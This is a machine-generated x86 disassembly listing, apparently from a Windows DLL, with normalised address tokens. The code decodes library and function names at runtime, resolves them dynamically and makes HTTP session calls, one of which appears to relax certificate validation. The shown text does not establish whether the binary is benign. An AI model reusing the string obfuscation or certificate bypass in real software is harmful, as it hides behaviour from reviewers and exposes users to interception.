cmp ecx edi
ja r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10024ce0
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
mov [ ecx ] eax
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10024ce0
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ eax + edi * 4 ]
mov [ ecx ] eax
sub_10024ce0
mov edx [ ecx + 0x8 ]
mov eax edx
push esi
mov esi [ ecx + 0x4 ]
sub eax esi
sar eax 0x2
cmp eax 0x1
jae r-xdata
pop esi
retn 0x4
sub esi [ ecx ]
push edi
mov edi 0x3fffffff
sar esi 0x2
mov eax edi
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edx [ ecx ]
inc esi
sar edx 0x2
mov eax edx
shr eax 0x1
sub edi eax
cmp edi edx
pop edi
jae r-xdata
add edx eax
cmp edx esi
cmovb edx esi
push edx
call sub_10024d50
xor edx edx
cmp edx esi
cmovb edx esi
push edx
call sub_10024d50
pop esi
retn 0x4
sub_10024d50
push ebp
mov ebp esp
push 0xffffffff
push sub_10050280
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
xor esi esi
mov [ ebp - 0x14 ] esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push esi
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_10024e30
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov eax [ edi + 0x4 ]
sub eax ecx
sar eax 0x2
mov [ ebp + 0x8 ] eax
test ecx ecx
je r-xdata
cmp ebx 0x3fffffff
ja r-xdata
lea eax [ esi + ebx * 4 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
lea eax [ esi + eax * 4 ]
mov [ edi + 0x4 ] eax
mov [ edi ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ecx
call j_sub_1003f3e3#2
add esp 0x4
call sub_1003c58d
lea eax [ ebx * 4 ]
push eax
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
sub_10024e30
push ebp
mov ebp esp
push 0xffffffff
push sub_100502b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
add esi 0x4
mov [ ebp + 0x8 ] esi
add ecx 0x4
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ecx ]
mov [ esi ] eax
cmp ecx edx
je r-xdata
sub_10024ee0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100250b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10024f10
push ebp
mov ebp esp
push 0xffffffff
push sub_1005032d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
sub esp 0x3c
mov esi esp
mov [ ebp - 0x10 ] esp
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] esi
mov ecx esi
push 0xffffffff
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x2c ]
push eax
lea ecx [ esi + 0x24 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ esi + 0x30 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_10030eb0
mov [ ebp - 0x4 ] 0x6
xor eax eax
mov [ edi ] r--data
mov [ edi + 0x98 ] 0x7
mov [ edi + 0x94 ] 0x0
mov [ edi + 0x84 ] ax
mov [ ebp - 0x4 ] 0x7
mov [ edi + 0xb0 ] 0x7
mov [ edi + 0xac ] eax
mov [ edi + 0x9c ] ax
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp + 0x44 ]
mov [ edi + 0x3c ] ecx
mov ecx [ ebp + 0x48 ]
mov [ edi + 0x40 ] ecx
mov ecx edi
call sub_10025030
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_100047b0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x44
sub_10025030
mov [ ecx + 0x74 ] 0x0
mov [ ecx + 0x78 ] 0x0
mov [ ecx + 0x7c ] 0x0
mov [ ecx + 0x80 ] 0x0
mov [ ecx + 0x4c ] 0x0
mov [ ecx + 0x6c ] 0x0
mov [ ecx + 0x70 ] 0x0
mov [ ecx + 0x44 ] 0x0
mov [ ecx + 0x48 ] 0x0
mov [ ecx + 0x50 ] 0x0
mov [ ecx + 0x54 ] 0x0
mov [ ecx + 0x58 ] 0x0
mov [ ecx + 0x5c ] 0x0
mov [ ecx + 0x60 ] 0x0
mov [ ecx + 0x64 ] 0x0
mov [ ecx + 0x68 ] 0x0
retn
sub_100250b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050374
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0x48 ]
call eax
mov [ esi + 0x7c ] 0x0
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x78 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0xb0 ] 0x8
jb r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x74 ] 0x0
xor eax eax
mov [ esi + 0xb0 ] 0x7
mov [ esi + 0xac ] 0x0
mov [ esi + 0x9c ] ax
mov [ ebp - 0x4 ] al
cmp [ esi + 0x98 ] 0x8
jb r-xdata
push [ esi + 0x9c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x98 ] 0x7
xor eax eax
mov [ esi + 0x94 ] 0x0
mov [ esi + 0x84 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_100310d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x84 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100251c0
push ebp
mov ebp esp
and esp 0xfffffff0
push 0xffffffff
push sub_100503a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xcdc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xcd4 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xce8 ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x18 ] eax
jne r-xdata
mov ecx 0x11
call sub_100383b0
push eax
push rw-data
call esi
mov ecx [ rw-data ]
push eax
mov [ esp + 0x24 ] ecx
call [ LoadLibraryW@IAT ]
mov [ edi + 0x78 ] eax
test eax eax
je r-xdata
mov ecx 0x12
call sub_100383b0
push eax
push rw-data
call esi
mov eax [ esp + 0x18 ]
mov eax [ edi + 0x4c ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push [ esp + 0x20 ]
call [ LoadLibraryW@IAT ]
mov [ edi + 0x74 ] eax
test eax eax
jne r-xdata
lea ecx [ esp + 0x3c ]
mov [ esp + 0x3c ] 0xc75
push ecx
lea ecx [ esp + 0x68 ]
push ecx
push 0x0
call eax
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
push [ edi + 0x78 ]
call [ GetProcAddress@IAT ]
mov [ edi + 0x4c ] eax
mov ecx 0x5f
call sub_100382c0
push eax
push rw-data
call esi
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub esp 0x18
lea eax [ esp + 0x7c ]
mov ecx esp
mov [ esp + 0x34 ] esp
push eax
call sub_10001820
mov [ esp + 0xd08 ] 0x0
mov [ esp + 0xd08 ] 0xffffffff
lea ecx [ esp + 0x64 ]
call sub_1003bfd0
mov ecx eax
add esp 0x18
mov [ esp + 0x18 ] ecx
mov [ esp + 0xcf0 ] 0x1
lea eax [ edi + 0x9c ]
cmp eax ecx
je r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x20 ] eax
jne r-xdata
mov ecx 0x60
call sub_100382c0
push eax
push rw-data
call esi
mov ecx [ esp + 0xce8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0xcd4 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov [ esp + 0xcf0 ] 0xffffffff
cmp [ esp + 0x60 ] 0x8
jb r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x18 ] eax
jne r-xdata
mov ecx 0x61
call sub_100382c0
push eax
push rw-data
call esi
xor eax eax
mov [ esp + 0x60 ] 0x7
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x4c ] ax
push [ esp + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
xor edx edx
mov [ eax + 0x14 ] 0x7
push ecx
mov [ eax + 0x10 ] 0x0
mov ecx eax
mov [ eax ] dx
call sub_10003980
push [ eax ]
call j_sub_1003f3e3#2
mov ecx [ esp + 0x1c ]
lea eax [ edi + 0x9c ]
add esp 0x4
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x38 ] eax
jne r-xdata
mov ecx 0x62
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x40 ] eax
jne r-xdata
mov ecx 0x63
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x34 ] eax
jne r-xdata
mov ecx 0x64
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x48 ] eax
jne r-xdata
mov ecx 0x65
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x44 ] eax
jne r-xdata
mov ecx 0x66
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx 0x67
call sub_100382c0
push eax
push rw-data
call esi
push [ esp + 0x20 ]
mov esi [ rw-data ]
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push [ esp + 0x18 ]
mov [ edi + 0x44 ] eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push [ esp + 0x38 ]
mov [ edi + 0x48 ] eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push [ esp + 0x40 ]
mov [ edi + 0x50 ] eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push [ esp + 0x34 ]
mov [ edi + 0x54 ] eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push [ esp + 0x48 ]
mov [ edi + 0x58 ] eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push [ esp + 0x44 ]
mov [ edi + 0x5c ] eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push [ esp + 0x1c ]
mov [ edi + 0x60 ] eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push esi
push [ edi + 0x74 ]
mov [ edi + 0x64 ] eax
call [ GetProcAddress@IAT ]
cmp [ edi + 0x40 ] 0x0
mov [ edi + 0x68 ] eax
je r-xdata
mov ecx 0x68
call sub_100382c0
push eax
push rw-data
call esi
cmp [ edi + 0x7c ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
cmp [ edi + 0x7c ] eax
setne al
cmp [ edi + 0xb0 ] 0x8
lea eax [ edi + 0x9c ]
jb r-xdata
mov esi [ InterlockedExchange@IAT ]
mov ecx 0x69
call sub_100382c0
mov esi [ InterlockedExchange@IAT ]
push eax
push rw-data
call esi
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ edi + 0x44 ]
call eax
mov [ edi + 0x7c ] eax
mov eax [ eax ]
mov esi [ rw-data ]
push eax
push [ edi + 0x74 ]
call [ GetProcAddress@IAT ]
push esi
push [ edi + 0x74 ]
mov [ edi + 0x6c ] eax
call [ GetProcAddress@IAT ]
mov [ edi + 0x70 ] eax
test eax eax
je r-xdata
mov ecx 0x6a
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ esp + 0x1c ]
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ edi + 0x6c ]
test eax eax
je r-xdata
lea ecx [ esp + 0x24 ]
xorps xmm0 xmm0
push ecx
movdqa [ esp + 0x28 ] xmm0
call eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov [ edi + 0x80 ] 0x1
cmp [ edi + 0x80 ] 0x0
mov esi [ GlobalFree@IAT ]
jne r-xdata
push eax
lea ecx [ edi + 0x84 ]
mov [ edi + 0x80 ] 0x2
call sub_100093d0
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ edi + 0xb0 ] 0x8
lea eax [ edi + 0x9c ]
jb r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
push eax
call esi
push 0x0
push [ esp + 0x34 ]
push ecx
push 0x3
push eax
mov eax [ edi + 0x44 ]
call eax
mov [ edi + 0x7c ] eax
mov eax [ eax ]
push eax
call esi
jmp r-xdata
sub_100256f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050462
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1248
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x11ec ] esi
mov [ ebp - 0x1254 ] esi
mov [ ebp - 0x11f0 ] eax
mov [ ebp - 0x11dc ] 0x0
mov [ ebp - 0x4 ] 0x1
sub esp 0x18
mov ecx esp
mov [ ebp - 0x11d8 ] esp
lea eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1158 ]
call sub_1003bfd0
add esp 0x18
mov [ ebp - 0x4 ] 0x3
cmp [ edi + 0x3c ] 0x0
jne r-xdata
push 0x3c
lea eax [ ebp - 0x1250 ]
push 0x0
push eax
call sub_10045ec0
xor ecx ecx
mov [ ebp - 0x1250 ] 0x3c
mov eax 0xc03
mov [ ebp - 0x123c ] 0xc03
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
push [ ebp - 0x123c ]
mov [ ebp - 0x1240 ] eax
push 0x0
push eax
call sub_10045ec0
xor ecx ecx
mov [ ebp - 0x1220 ] 0x11b5
mov eax 0x11b5
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
push [ ebp - 0x1220 ]
mov [ ebp - 0x1224 ] eax
push 0x0
push eax
call sub_10045ec0
add esp 0x2c
lea ecx [ ebp - 0x1250 ]
cmp [ ebp - 0x1144 ] 0x8
lea eax [ ebp - 0x1158 ]
cmovae eax [ ebp - 0x1158 ]
push ecx
push __dos_header
push [ ebp - 0x1148 ]
push eax
mov eax [ edi + 0x60 ]
call eax
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ edi + 0x50 ]
push 0x0
push [ ebp - 0x1238 ]
push [ ebp - 0x1240 ]
push [ edi + 0x7c ]
call eax
mov [ ebp - 0x11e4 ] eax
test eax eax
jne r-xdata
push [ ebp - 0x1240 ]
call j_sub_1003f3e3
push [ ebp - 0x1224 ]
call j_sub_1003f3e3
add esp 0x8
call [ GetLastError@IAT ]
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ 0x0 ] cl
je r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx 0x13
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x1240 ]
mov esi eax
call j_sub_1003f3e3
push [ ebp - 0x1224 ]
call j_sub_1003f3e3
add esp 0x8
push esi
mov esi [ ebp - 0x11ec ]
push esi
call sub_100311f0
jmp r-xdata
push ecx
push 0x0
mov ecx esi
call sub_100019e0
lea edx [ ecx + 0x1 ]
mov edi edi
mov ecx edx
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x11e0 ] eax
xor ecx ecx
jmp r-xdata
mov edx [ rw-data ]
mov ecx edx
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x11e0 ] eax
mov ecx 0x14
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ ebp - 0x11dc ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1144 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x1144 ] 0x7
mov [ ebp - 0x1148 ] 0x0
mov [ ebp - 0x1158 ] ax
mov [ ebp - 0x4 ] al
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
push [ ebp - 0x1158 ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x11e0 ]
sar ecx 0x1
push ecx
push edx
lea ecx [ ebp - 0x1158 ]
call sub_10005dc0
mov [ ebp - 0x1178 ] 0x0
mov [ ebp - 0x1174 ] 0x0
mov [ ebp - 0x1174 ] 0xf
mov [ ebp - 0x1178 ] 0x0
mov [ ebp - 0x1188 ] 0x0
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x1188 ]
push eax
push [ ebp - 0x11f0 ]
mov ecx edi
call sub_100318a0
sub esp 0x18
lea eax [ ebp - 0x1188 ]
mov ecx esp
mov [ ebp - 0x11d8 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x11d0 ]
call sub_1003bfd0
add esp 0x18
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebp - 0x1158 ]
push 0xffffffff
push 0x0
push eax
call sub_10005cf0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x11bc ] 0x8
jb r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x11e0 ]
lea eax [ ebp - 0x1158 ]
sar ecx 0x1
cmp [ ebp - 0x1144 ] 0x8
push ecx
cmovae eax [ ebp - 0x1158 ]
push edx
push eax
call sub_1003d538
add esp 0xc
mov ecx 0x800000
test eax eax
mov eax 0x0
cmove eax ecx
cmp [ rw-data ] 0x0
mov [ ebp - 0x11e0 ] eax
jne r-xdata
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x11bc ] 0x7
mov [ ebp - 0x11c0 ] 0x0
mov [ ebp - 0x11d0 ] ax
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x1174 ] 0x10
jb r-xdata
push [ ebp - 0x11d0 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x11d4 ] ecx
jne r-xdata
mov ecx 0x15
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x1174 ] 0xf
mov [ ebp - 0x1178 ] 0x0
mov [ ebp - 0x1188 ] 0x0
push [ ebp - 0x1188 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ rw-data ]
cmp [ edi + 0x3c ] 0x0
cmovne ecx eax
mov eax [ ebp - 0x11e0 ]
or eax 0x100
push eax
mov eax [ edi + 0x54 ]
push 0x0
push 0x0
push 0x0
push [ ebp - 0x1224 ]
push ecx
push [ ebp - 0x11e4 ]
call eax
push [ ebp - 0x1240 ]
mov [ ebp - 0x11d4 ] eax
call j_sub_1003f3e3
push [ ebp - 0x1224 ]
call j_sub_1003f3e3
mov eax [ ebp - 0x11d4 ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x16
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx [ ebp - 0x11d4 ]
test [ ebp - 0x11e0 ] 0x800000
je r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x11e4 ]
mov ecx [ edi + 0x48 ]
mov esi eax
call ecx
push esi
mov esi [ ebp - 0x11ec ]
push esi
call sub_100311f0
jmp r-xdata
mov ecx [ edi + 0x80 ]
cmp ecx 0x1
je r-xdata
push 0x4
lea ecx [ ebp - 0x11d8 ]
mov [ ebp - 0x11d8 ] 0x3300
push ecx
push 0x1f
push eax
mov eax [ edi + 0x58 ]
call eax
mov [ ebp - 0x11e8 ] 0x0
lea ecx [ ecx ]
cmp ecx 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
mov [ ebp - 0x1214 ] eax
mov [ ebp - 0x1210 ] 0x3
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x1144 ] 0x8
lea ecx [ ebp - 0x11fc ]
push ecx
lea ecx [ ebp - 0x1214 ]
lea eax [ ebp - 0x1158 ]
cmovae eax [ ebp - 0x1158 ]
push ecx
push eax
push [ edi + 0x7c ]
mov eax [ edi + 0x70 ]
call eax
test eax eax
jne r-xdata
cmp [ edi + 0x98 ] 0x8
mov [ ebp - 0x1214 ] eax
lea eax [ edi + 0x84 ]
jb r-xdata
mov [ ebp - 0x1200 ] 0x1
mov eax [ rw-data ]
xor edx edx
mov [ ebp - 0x1160 ] edx
xor esi esi
mov [ ebp - 0x115c ] edx
mov [ ebp - 0x115c ] 0xf
mov [ ebp - 0x1160 ] edx
mov [ ebp - 0x1170 ] dl
mov [ ebp - 0x4 ] 0x7
cmp [ edi + 0x3c ] esi
je r-xdata
mov ecx 0x17
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
push 0xc
lea eax [ ebp - 0x11fc ]
push eax
mov eax [ edi + 0x58 ]
push 0x26
push [ ebp - 0x11d4 ]
call eax
mov [ ebp - 0x11d8 ] eax
call [ GetLastError@IAT ]
mov edx [ ebp - 0x11f8 ]
mov ecx [ GlobalFree@IAT ]
mov [ ebp - 0x11e0 ] eax
test edx edx
je r-xdata
call [ GetLastError@IAT ]
call [ GetLastError@IAT ]
mov [ ebp - 0x11d8 ] eax
call [ GetLastError@IAT ]
cmp eax 0x2f94
jne r-xdata
mov [ ebp - 0x120c ] eax
mov eax [ eax ]
mov eax [ ebp - 0x1160 ]
lea ecx [ ebp - 0x1170 ]
cmp [ ebp - 0x115c ] 0x10
push 0x0
cmovae ecx [ ebp - 0x1170 ]
push eax
push eax
mov eax [ edi + 0x5c ]
push ecx
push esi
mov esi [ ebp - 0x11d4 ]
push edx
push esi
call eax
test eax eax
jne r-xdata
mov esi eax
mov [ ebp - 0x11d8 ] eax
lea ecx [ esi + 0x2 ]
lea esp [ esp ]
mov eax [ ebp - 0x11f4 ]
test eax eax
je r-xdata
push edx
call ecx
mov ecx [ GlobalFree@IAT ]
cmp [ ebp - 0x11d8 ] 0x2eef
je r-xdata
mov ecx [ ebp - 0x11e8 ]
inc ecx
mov [ ebp - 0x11e8 ] ecx
jmp r-xdata
mov eax [ edi + 0x64 ]
push 0x0
push esi
call eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x11d4 ]
mov ecx [ edi + 0x48 ]
mov esi eax
call ecx
push [ ebp - 0x11e4 ]
mov ecx [ edi + 0x48 ]
call ecx
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
lea eax [ ebp - 0x1170 ]
sub esi ecx
push eax
push [ ebp - 0x11f0 ]
mov ecx edi
sar esi 0x1
call sub_100318a0
mov edx [ ebp - 0x11d8 ]
cmp [ ebp - 0x11d8 ] 0x0
jne r-xdata
push eax
call ecx
push [ ebp - 0x11d4 ]
mov eax [ edi + 0x48 ]
call eax
push [ ebp - 0x11e4 ]
mov eax [ edi + 0x48 ]
call eax
push [ edi + 0x7c ]
mov eax [ edi + 0x48 ]
call eax
cmp [ edi + 0xb0 ] 0x8
lea eax [ edi + 0x9c ]
jb r-xdata
mov ecx [ ebp - 0x11e8 ]
cmp ecx 0x3
jb r-xdata
mov [ ebp - 0x11a8 ] 0x0
mov [ ebp - 0x11a4 ] 0x0
mov [ ebp - 0x11a4 ] 0xf
mov [ ebp - 0x11a8 ] 0x0
mov [ ebp - 0x11b8 ] 0x0
mov [ ebp - 0x4 ] 0x8
lea eax [ ebp - 0x11e8 ]
push eax
push 0x1130
lea eax [ ebp - 0x1140 ]
mov [ ebp - 0x11e8 ] 0x0
push eax
mov eax [ edi + 0x68 ]
push esi
call eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x11d4 ]
mov ecx [ edi + 0x48 ]
mov esi eax
call ecx
push [ ebp - 0x11e4 ]
mov ecx [ edi + 0x48 ]
call ecx
call [ GetLastError@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x1170 ]
call sub_10001880
push [ ebp - 0x11d4 ]
mov eax [ edi + 0x48 ]
call eax
push [ ebp - 0x11e4 ]
mov eax [ edi + 0x48 ]
call eax
push [ ebp - 0x11e0 ]
push esi
call sub_100311f0
mov [ ebp - 0x11dc ] 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ edi + 0x44 ]
call eax
push 0x2eef
push esi
mov [ edi + 0x7c ] eax
call sub_100311f0
mov [ ebp - 0x11dc ] 0x1
jmp r-xdata
mov eax [ eax ]
mov eax [ edi + 0x80 ]
xorps xmm0 xmm0
movq [ ebp - 0x1204 ] xmm0
movq [ ebp - 0x11fc ] xmm0
mov [ ebp - 0x11f4 ] 0x0
movdqu [ ebp - 0x1214 ] xmm0
cmp eax 0x1
jne r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x11d4 ]
mov ecx [ edi + 0x48 ]
mov esi eax
call ecx
push [ ebp - 0x11e4 ]
mov ecx [ edi + 0x48 ]
call ecx
push esi
mov esi [ ebp - 0x11ec ]
push esi
